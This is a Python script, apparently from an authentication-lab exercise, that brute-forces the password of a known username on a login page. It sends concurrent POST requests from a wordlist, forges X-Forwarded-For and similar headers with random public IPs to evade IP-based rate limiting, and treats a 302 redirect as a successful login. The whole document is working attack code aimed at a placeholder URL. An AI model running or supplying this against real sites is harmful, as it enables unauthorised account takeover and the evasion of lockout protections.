import random
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

URL = "https://YOUR-LINK/login"
WORDLIST = "authentication/wordlist/passwords.txt"
VALID_USERNAME = "placeholder"  # Replace with valid username from Phase 1
NUM_WORKERS = 10 # Safe to use concurrency here — we're watching status codes, not timing

with open(WORDLIST) as wordlist_file:
    passwords = wordlist_file.read().splitlines()

print(f"[*] Target Username : {VALID_USERNAME}")
print(f"[*] Total Passwords to Test : {len(passwords)}")
print(f"[*] Workers : {NUM_WORKERS} (sequential)")
print()

# IP GENERATOR — random public-looking IP
# Avoids all reserved/private ranges:
#   10.x.x.x / 172.16-31.x.x / 192.168.x.x
#   127.x.x.x / 0.x.x.x / 255.x.x.x
# Uses index as seed so each password always gets the same IP
# (deterministic and reproducible)
def generate_public_ip(seed: int) -> str:
    rng = random.Random(seed)
    while True:
        octet_1 = rng.randint(1, 254)
        octet_2 = rng.randint(0, 255)
        octet_3 = rng.randint(0, 255)
        octet_4 = rng.randint(1, 254)
        # Skip reserved ranges
        if octet_1 == 10:
            continue
        if octet_1 == 127:
            continue
        if octet_1 == 172 and 16 <= octet_2 <= 31:
            continue
        if octet_1 == 192 and octet_2 == 168:
            continue
        if octet_1 == 0 or octet_1 == 255:
            continue
        
        return f"{octet_1}.{octet_2}.{octet_3}.{octet_4}"

# REQUEST FUNCTION
# Unlike Phase 1, we are not measuring timing here
# We are watching for a 302 redirect — that means successful login
# 200 = failed login (server shows login page again)
# 302 = success (server redirects to authenticated page)
# Retries up to 3 times on connection errors (e.g. temporary DNS failure)
def check_password(index: int, password: str):
    spoofed_ip  = generate_public_ip(index)
    max_retries = 3

    headers = {
        "X-Forwarded-For" : spoofed_ip,
        "X-Real-IP"       : spoofed_ip,
        "X-Remote-IP"     : spoofed_ip,
        "X-Client-IP"     : spoofed_ip,
    }

    data = {
        "username": VALID_USERNAME,
        "password": password
    }

    for attempt in range(1, max_retries + 1):
        try:
            # allow_redirects=False so we can catch the 302 directly
            # instead of following it and seeing the final page
            response = requests.post(URL, data=data, headers=headers, allow_redirects=False)

            return {
                "index"      : index,
                "password"   : password,
                "spoofed_ip" : spoofed_ip,
                "status_code": response.status_code,
            }

        except requests.exceptions.ConnectionError as error:
            print(f"[!] Connection error on password: {password} (attempt {attempt}/{max_retries}) — {error}")

            if attempt < max_retries:
                time.sleep(2)  # Wait 2 seconds before retrying
            else:
                print(f"  [!] Max retries reached for password: {password} — skipping")
                return {
                    "index" : index,
                    "password" : password,
                    "spoofed_ip" : spoofed_ip,
                    "status_code": None,  # None signals a failed request, not a login result
                }

# MAIN LOOP — sequential requests, stop immediately on 302
found = None

with ThreadPoolExecutor(max_workers=NUM_WORKERS) as executor:
    futures = {
        executor.submit(check_password, index, password): password
        for index, password in enumerate(passwords)
    }

    for future in as_completed(futures):
        result = future.result()

        # Skip printing if the request failed entirely after all retries
        if result["status_code"] is None:
            continue

        print(
            f"[{result['index']:>4}] "
            f"Password: {result['password']:<20} | "
            f"IP: {result['spoofed_ip']:<16} | "
            f"Status: {result['status_code']}"
        )

        # 302 means successful login — stop immediately
        if result["status_code"] == 302:
            found = result
            executor.shutdown(wait=False, cancel_futures=True)
            break

# SUMMARY
print()
print("=" * 70)
print("RESULT")
print("=" * 70)

if found:
    print(f"\n[+] Valid password found : {found['password']}")
    print(f"Username       : {VALID_USERNAME}")
    print(f"Spoofed IP     : {found['spoofed_ip']}")
    print(f"Status Code    : {found['status_code']} (302 — login successful)")
else:
    print("\n[-] No valid password found — wordlist exhausted.")
    print("Try a different wordlist or verify the username from Phase 1.")